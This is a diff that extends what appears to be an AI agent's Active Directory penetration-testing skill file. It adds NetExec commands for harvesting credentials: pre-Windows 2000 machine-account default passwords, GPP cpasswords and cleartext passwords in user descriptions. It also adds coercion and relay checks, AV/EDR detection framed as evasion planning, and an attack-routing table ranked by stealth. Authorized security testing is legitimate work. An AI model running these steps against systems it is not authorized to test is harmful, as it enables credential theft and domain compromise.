@@ -12,6 +12,10 @@ keywords:
   - find attack paths
   - domain controllers
   - kerberos
+  - pre2k
+  - pre-created computer accounts
+  - machine account default password
+  - netexec modules
 tools:
   - bloodhound-python
   - rusthound-ce
@@ -206,6 +210,15 @@ kerbrute userenum -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL usernames.txt
 
 Use output as username list for **password-spraying** and AS-REP roasting checks.
 
+### Unauthenticated ADCS CA Enumeration
+
+```bash
+# Enumerate Certificate Authorities via RPC — no credentials needed
+nxc smb DC01.DOMAIN.LOCAL -M enum_ca
+```
+
+If CAs found, note for authenticated ADCS enumeration in Step 3 (certipy).
+
 ### LLMNR/NBT-NS/mDNS Poisoning Check
 
 If network position allows, note LLMNR/NBT-NS traffic for Responder-based
@@ -309,6 +322,140 @@ enum4linux -u 'user' -p 'Password123' -P DC01.DOMAIN.LOCAL
 
 Record lockout threshold, observation window, complexity requirements. Pass
 to **password-spraying** skill.
+
+### Fine-Grained Password Policies (PSOs)
+
+```bash
+# Fine-grained password policies — different groups may have different lockout rules
+nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M pso
+```
+
+PSOs override default domain policy for specific groups. A service account
+group may have no lockout while user accounts lock at 5 attempts. Report any
+PSOs found — they affect **password-spraying** decisions.
+
+### Pre-Windows 2000 Computer Accounts
+
+**High-value quick win.** Pre-created computer accounts (created via "Pre-Windows
+2000 Compatible" checkbox in ADUC or `New-ADComputer`) often have their password
+set to the sAMAccountName in lowercase, minus the trailing `$`. For example,
+`MS01$` has password `ms01`. This is a common administrative oversight that
+yields machine account credentials with zero noise.
+
+```bash
+# Identify pre-created computer accounts and test default passwords
+# The module checks for accounts and attempts TGT with default password
+nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M pre2k
+```
+
+**What pre2k checks:**
+1. Finds computer accounts in the "Pre-Windows 2000 Compatible Access" group
+   or with `userAccountControl` flags indicating pre-creation
+2. Tests each account with `sAMAccountName.rstrip('$').lower()` as the password
+3. Attempts to obtain a TGT — if successful, the password is confirmed
+
+**Why this matters:**
+- Machine accounts often have broad read rights (BloodHound "Owned" marking)
+- Machine accounts in groups like "Domain Secure Servers" can read gMSA passwords
+- Machine accounts may have constrained delegation, RBCD, or other privileges
+- A pre2k computer account is functionally equivalent to a domain user credential
+  but with a machine account's group memberships and trust level
+
+If pre2k finds valid machine credentials → record as a credential finding in
+your return summary. Include: account name, confirmed password, and any group
+memberships or privileges visible from LDAP. The orchestrator will route to
+appropriate technique skills (pass-the-hash, kerberos-delegation, etc.).
+
+### NetExec Module Sweep
+
+Run these modules as a batch during authenticated enumeration. They are all
+non-destructive and low-privilege — any domain user can run them.
+
+#### Quick-Win Credential Checks
+
+```bash
+# User descriptions — frequently contain cleartext passwords
+nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M get-desc-users
+
+# GPP cpassword in SYSVOL (MS14-025)
+nxc smb DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M gpp_password
+
+# Autologon credentials from registry.xml in SYSVOL
+nxc smb DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M gpp_autologin
+```
+
+**User descriptions** are a common source of cleartext passwords — admins often
+document initial passwords or service account passwords in the AD description
+field. Any result containing password-like strings is a credential finding.
+
+#### Coercion & Relay Surface
+
+```bash
+# WebClient service (WebDAV) — enables HTTP-based NTLM coercion
+# Critical: if WebDAV is running, coercion can use HTTP instead of SMB
+# which bypasses SMB signing and enables relay to LDAP/ADCS
+nxc smb DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M webdav
+
+# Print Spooler — enables PrinterBug/SpoolSample coercion
+nxc smb DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M spooler
+
+# Broad coercion vulnerability check (check-only mode — no LISTENER set)
+# Tests for PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MSEven, etc.
+nxc smb DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M coerce_plus
+```
+
+Note all coercion-eligible hosts for **auth-coercion-relay**. WebDAV is
+especially valuable — it enables HTTP-based coercion that works even when SMB
+signing is enforced.
+
+#### Attack Surface Mapping
+
+```bash
+# AV/EDR detection — identifies endpoint security products
+nxc smb DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M enum_av
+
+# MachineAccountQuota — can current user add computer accounts?
+# MAQ > 0 enables resource-based constrained delegation (RBCD) attacks
+nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M maq
+
+# Obsolete/EOL operating systems — unpatched, vulnerable to known CVEs
+nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M obsolete
+
+# BadSuccessor (dMSA) — CVE-2025-21293, privilege escalation via
+# delegated Managed Service Accounts
+nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M badsuccessor
+```
+
+#### Network Topology
+
+```bash
+# DNS records from AD — all A/AAAA/CNAME/SRV records in the domain
+nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M get-network
+
+# AD Sites and Subnets — reveals internal network segmentation
+nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M subnets
+
+# Additional network interfaces on hosts (multi-homed pivot targets)
+nxc smb DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M ioxidresolver
+```
+
+#### SCCM and Infrastructure
+
+```bash
+# SCCM discovery via LDAP
+nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M sccm
+
+# Entra ID (Azure AD Connect) sync server
+nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M entra-id
+
+# DNS zones allowing nonsecure dynamic updates (ADIDNS poisoning)
+nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' -M dns-nonsecure
+```
+
+If SCCM found → note for **sccm-exploitation**. If Entra ID Connect server
+found → high-value target (stores cleartext AD sync credentials). If
+nonsecure DNS updates allowed → note for **auth-coercion-relay** (ADIDNS
+poisoning enables MITM/coercion without LLMNR).
 
 ### SPN Enumeration (Kerberoasting Targets)
 
@@ -497,28 +644,35 @@ the matched skill. Do not execute attack techniques inline.
 
 | Finding | Indicator | Route To |
 |---------|-----------|----------|
+| Pre-2k computer account creds | nxc -M pre2k (TGT obtained) | **pass-the-hash** (machine account) |
 | User accounts with SPNs | GetUserSPNs output shows SPNs | **kerberos-roasting** |
 | Users without pre-auth | GetNPUsers / DONT_REQ_PREAUTH flag | **kerberos-roasting** (AS-REP section) |
 | Valid username list obtained | RID cycling / kerbrute / LDAP | **password-spraying** |
+| Cleartext password in description | nxc -M get-desc-users | **pass-the-hash** or deeper enum |
+| GPP cpassword found | nxc -M gpp_password / gpp_autologin | **pass-the-hash** or deeper enum |
 | NTLM hash obtained | SAM dump / LSASS / secretsdump | **pass-the-hash** |
 | AES keys obtained | DCSync / secretsdump / LSASS | **pass-the-hash** (Pass-the-Key) |
 | Kerberos ticket captured | Delegation / ticket dump | **pass-the-hash** (Pass-the-Ticket) |
 | Unconstrained delegation host | TRUSTED_FOR_DELEGATION flag | **kerberos-delegation** |
 | Constrained delegation | msDS-AllowedToDelegateTo set | **kerberos-delegation** |
 | RBCD writable | Write to msDS-AllowedToActOnBehalf | **kerberos-delegation** |
+| MAQ > 0 + write target | nxc -M maq + ACL check | **kerberos-delegation** (RBCD) |
 | krbtgt hash obtained | DCSync of krbtgt | **kerberos-ticket-forging** |
 | Service account hash obtained | Kerberoast / DCSync | **kerberos-ticket-forging** (Silver) |
 | GenericAll on user/group | BloodHound / ACL scan | **acl-abuse** |
 | WriteDACL / WriteOwner | BloodHound / ACL scan | **acl-abuse** |
 | ForceChangePassword | BloodHound | **acl-abuse** |
 | msDS-KeyCredentialLink writable | BloodHound | **acl-abuse** (Shadow Credentials) |
+| BadSuccessor (dMSA) vulnerable | nxc -M badsuccessor | **acl-abuse** (dMSA) |
 | Vulnerable ADCS templates (ESC1-3,6) | certipy find -vulnerable | **adcs-template-abuse** |
 | CA/template ACL abuse (ESC4-5,7) | certipy / BloodHound ADCS | **adcs-access-and-relay** |
 | HTTP/RPC enrollment (ESC8,11) | certipy / nmap web enrollment | **adcs-access-and-relay** |
 | Weak cert mapping (ESC9-15) | certipy find | **adcs-persistence** |
 | SMB signing disabled | nxc smb signing:False | **auth-coercion-relay** |
 | LDAP signing not required | nxc ldap signing:None | **auth-coercion-relay** |
-| Spooler service running | `ls \\\\host\\pipe\\spoolss` | **auth-coercion-relay** |
+| WebDAV enabled on target | nxc -M webdav | **auth-coercion-relay** (HTTP coercion) |
+| Spooler service running | nxc -M spooler | **auth-coercion-relay** |
+| Coercion vulns confirmed | nxc -M coerce_plus | **auth-coercion-relay** |
 | LLMNR/NBT-NS traffic | Responder analysis mode | **auth-coercion-relay** |
 | DCSync rights (Replication perms) | BloodHound | **credential-dumping** |
 | Local admin on DC | BloodHound / Pwn3d! | **credential-dumping** |
@@ -526,20 +680,25 @@ the matched skill. Do not execute attack techniques inline.
 | gMSA/dMSA readable | nxc --gmsa output | **credential-dumping** |
 | GPO write access | BloodHound | **gpo-abuse** |
 | Domain/forest trusts | Trust enumeration | **trust-attacks** |
-| SCCM infrastructure | sccmhunter find | **sccm-exploitation** |
+| SCCM infrastructure | nxc -M sccm / sccmhunter | **sccm-exploitation** |
+| Entra ID Connect server | nxc -M entra-id | **credential-dumping** (sync creds) |
+| EOL operating systems | nxc -M obsolete | Note for CVE targeting |
+| AV/EDR products detected | nxc -M enum_av | Note for evasion planning |
 | Post-DA compromise | Full domain control | **ad-persistence** |
 
 ### Priority Order
 
 When multiple attack paths exist, prioritize by OPSEC and reliability:
 
-1. **Kerberos roasting / AS-REP roasting** — offline cracking, low detection
-2. **ADCS template abuse** — certificate-based, stealthy, persistent
-3. **ACL abuse** — targeted, often unmonitored
-4. **Delegation abuse** — Kerberos-based, moderate detection
-5. **Password spraying** — risk of lockout, use as last resort for initial access
-6. **Coercion/relay** — requires network position, noisy
-7. **Credential dumping** — requires existing admin access
+1. **Pre-2k computer accounts / GPP passwords / description creds** — instant
+   credentials, zero noise, no cracking needed
+2. **Kerberos roasting / AS-REP roasting** — offline cracking, low detection
+3. **ADCS template abuse** — certificate-based, stealthy, persistent
+4. **ACL abuse** — targeted, often unmonitored
+5. **Delegation abuse** — Kerberos-based, moderate detection
+6. **Password spraying** — risk of lockout, use as last resort for initial access
+7. **Coercion/relay** — requires network position, noisy
+8. **Credential dumping** — requires existing admin access
 
 ## Step 6: Escalate or Pivot
 
